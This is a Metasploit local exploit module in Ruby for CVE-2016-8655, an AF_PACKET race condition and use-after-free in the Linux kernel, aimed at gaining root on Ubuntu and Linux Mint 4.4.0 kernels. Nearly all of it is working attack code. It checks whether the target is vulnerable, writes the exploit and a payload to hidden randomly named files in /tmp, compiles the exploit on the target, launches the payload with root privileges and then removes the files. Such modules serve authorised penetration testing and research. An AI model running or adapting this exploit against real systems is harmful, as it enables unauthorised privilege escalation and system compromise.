# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Local
  Rank = GoodRanking
 
  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Post::Linux::Kernel
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;AF_PACKET chocobo_root Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a race condition and use-after-free in the
        packet_set_ring function in net/packet/af_packet.c (AF_PACKET) in
        the Linux kernel to execute code as root (CVE-2016-8655).
 
        The bug was initially introduced in 2011 and patched in 2016 in version
        4.4.0-53.74, potentially affecting a large number of kernels; however
        this exploit targets only systems using Ubuntu (Trusty / Xenial) kernels
        4.4.0 < 4.4.0-53, including Linux distros based on Ubuntu, such as
        Linux Mint.
 
        The target system must have unprivileged user namespaces enabled and
        two or more CPU cores.
 
        Bypasses for SMEP, SMAP and KASLR are included. Failed exploitation
        may crash the kernel.
 
        This module has been tested successfully on Linux Mint 17.3 (x86_64);
        Linux Mint 18 (x86_64); and Ubuntu 16.04.2 (x86_64) with kernel
        versions 4.4.0-45-generic and 4.4.0-51-generic.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;rebel&#039;,        # Discovery and chocobo_root.c exploit
          &#039;Brendan Coles&#039; # Metasploit
        ],
      &#039;DisclosureDate&#039; => &#039;Aug 12 2016&#039;,
      &#039;Platform&#039;       => [ &#039;linux&#039; ],
      &#039;Arch&#039;           => [ ARCH_X86, ARCH_X64 ],
      &#039;Targets&#039;        => [[ &#039;Auto&#039;, {} ]],
      &#039;Privileged&#039;     => true,
      &#039;References&#039;     =>
        [
          [ &#039;AKA&#039;, &#039;chocobo_root.c&#039; ],
          [ &#039;EDB&#039;, &#039;40871&#039; ],
          [ &#039;CVE&#039;, &#039;2016-8655&#039; ],
          [ &#039;BID&#039;, &#039;94692&#039; ],
          [ &#039;URL&#039;, &#039;http://seclists.org/oss-sec/2016/q4/607&#039; ],
          [ &#039;URL&#039;, &#039;http://seclists.org/oss-sec/2016/q4/att-621/chocobo_root_c.bin&#039; ],
          [ &#039;URL&#039;, &#039;https://github.com/bcoles/kernel-exploits/blob/master/CVE-2016-8655/chocobo_root.c&#039; ],
          [ &#039;URL&#039;, &#039;https://bitbucket.org/externalist/1day_exploits/src/master/CVE-2016-8655/CVE-2016-8655_chocobo_root_commented.c&#039; ],
          [ &#039;URL&#039;, &#039;https://usn.ubuntu.com/3151-1/&#039; ],
          [ &#039;URL&#039;, &#039;https://www.securitytracker.com/id/1037403&#039; ],
          [ &#039;URL&#039;, &#039;https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=84ac7260236a49c79eede91617700174c2c19b0c&#039; ]
        ],
      &#039;DefaultTarget&#039;  => 0))
    register_options [
      OptInt.new(&#039;TIMEOUT&#039;, [ true, &#039;Race timeout (seconds)&#039;, &#039;600&#039; ]),
      OptEnum.new(&#039;COMPILE&#039;, [ true, &#039;Compile on target&#039;, &#039;Auto&#039;, %w(Auto True False) ]),
      OptString.new(&#039;WritableDir&#039;, [ true, &#039;A directory where we can write files&#039;, &#039;/tmp&#039; ]),
    ]
  end
 
  def timeout
    datastore[&#039;TIMEOUT&#039;].to_i
  end
 
  def base_dir
    datastore[&#039;WritableDir&#039;].to_s
  end
 
  def upload(path, data)
    print_status "Writing &#039;#{path}&#039; (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
  end
 
  def upload_and_chmodx(path, data)
    upload path, data
    cmd_exec "chmod +x &#039;#{path}&#039;"
  end
 
  def upload_and_compile(path, data)
    upload "#{path}.c", data
 
    gcc_cmd = "gcc -o #{path} #{path}.c -lpthread"
    if session.type.eql? &#039;shell&#039;
      gcc_cmd = "PATH=$PATH:/usr/bin/ #{gcc_cmd}"
    end
    output = cmd_exec gcc_cmd
    rm_f "#{path}.c"
 
    unless output.blank?
      print_error output
      fail_with Failure::Unknown, "#{path}.c failed to compile"
    end
 
    cmd_exec "chmod +x #{path}"
  end
 
  def exploit_data(file)
    path = ::File.join Msf::Config.data_directory, &#039;exploits&#039;, &#039;CVE-2016-8655&#039;, file
    fd = ::File.open path, &#039;rb&#039;
    data = fd.read fd.stat.size
    fd.close
    data
  end
 
  def live_compile?
    return false unless datastore[&#039;COMPILE&#039;].eql?(&#039;Auto&#039;) || datastore[&#039;COMPILE&#039;].eql?(&#039;True&#039;)
 
    if has_gcc?
      vprint_good &#039;gcc is installed&#039;
      return true
    end
 
    unless datastore[&#039;COMPILE&#039;].eql? &#039;Auto&#039;
      fail_with Failure::BadConfig, &#039;gcc is not installed. Compiling will fail.&#039;
    end
  end
 
  def check
    version = kernel_release
    unless version =~ /^4\.4\.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic/
      vprint_error "Linux kernel version #{version} is not vulnerable"
      return CheckCode::Safe
    end
    vprint_good "Linux kernel version #{version} is vulnerable"
 
    arch = kernel_hardware
    unless arch.include? &#039;x86_64&#039;
      vprint_error "System architecture #{arch} is not supported"
      return CheckCode::Safe
    end
    vprint_good "System architecture #{arch} is supported"
 
    cores = get_cpu_info[:cores].to_i
    min_required_cores = 2
    unless cores >= min_required_cores
      vprint_error "System has less than #{min_required_cores} CPU cores"
      return CheckCode::Safe
    end
    vprint_good "System has #{cores} CPU cores"
 
    unless userns_enabled?
      vprint_error &#039;Unprivileged user namespaces are not permitted&#039;
      return CheckCode::Safe
    end
    vprint_good &#039;Unprivileged user namespaces are permitted&#039;
 
    CheckCode::Appears
  end
 
  def exploit
    if check != CheckCode::Appears
      fail_with Failure::NotVulnerable, &#039;Target is not vulnerable&#039;
    end
 
    if is_root?
      fail_with Failure::BadConfig, &#039;Session already has root privileges&#039;
    end
 
    unless cmd_exec("test -w &#039;#{base_dir}&#039; && echo true").include? &#039;true&#039;
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end
 
    # Upload exploit executable
    executable_name = ".#{rand_text_alphanumeric rand(5..10)}"
    executable_path = "#{base_dir}/#{executable_name}"
    if live_compile?
      vprint_status &#039;Live compiling exploit on system...&#039;
      upload_and_compile executable_path, exploit_data(&#039;chocobo_root.c&#039;)
    else
      upload_and_chmodx executable_path, exploit_data(&#039;chocobo_root&#039;)
    end
 
    # Upload payload executable
    payload_path = "#{base_dir}/.#{rand_text_alphanumeric rand(5..10)}"
    upload_and_chmodx payload_path, generate_payload_exe
 
    # Launch exploit
    print_status "Launching exploit (Timeout: #{timeout})..."
    output = cmd_exec "echo &#039;#{payload_path} & exit&#039; | #{executable_path}", nil, timeout
    output.each_line { |line| vprint_status line.chomp }
    print_status "Cleaning up #{payload_path} and #{executable_path}.."
    rm_f executable_path
    rm_f payload_path
  end
end

